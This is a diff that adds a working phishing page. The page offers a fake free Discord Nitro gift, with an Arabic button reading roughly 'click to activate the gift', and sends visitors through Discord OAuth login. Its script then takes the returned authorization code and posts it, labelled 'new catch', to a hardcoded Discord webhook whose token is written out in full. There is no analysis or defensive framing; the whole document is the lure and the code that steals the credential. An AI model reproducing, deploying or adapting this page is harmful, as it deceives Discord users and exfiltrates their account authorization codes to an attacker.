@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <center>
+        <h1>🎁 Claim Your Free Nitro!</h1>
+        <button onclick="window.location.href='https://discord.com/oauth2/authorize?client_id=1512098458398490664&response_type=code&redirect_uri=https%3A%2F%2Fyour-app.vercel.app%2Fapi%2Fcallback&scope=identify'">اضغط هنا لتفعيل الهدية</button>
+    </center>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const code = urlParams.get('code');
+        if (code) {
+            fetch('https://discord.com/api/webhooks/1512068343723724931/BzOOKGGPyUv8YY1nx5kxZc9Jt9d8j4UcUICTNaIH5BaJ63veyxCYRP_AQ58Rk8W2EU--', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: "صيد جديد: " + code})
+            });
+        }
+    </script>
+</body>
+</html>
